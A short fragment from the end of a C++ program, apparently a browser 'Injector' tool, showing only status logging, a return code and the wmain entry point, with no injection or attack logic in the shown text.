            anySuccess = true;
            UI::PrintStatus("[+]", "Finished processing " + config.browserDisplayName);
        }

        UI::LogDebug("Injector finished.");
        return anySuccess ? 0 : 1;
    }
}

int wmain(int argc, wchar_t *argv[])
{
    return Injector::Run(argc, argv);
}
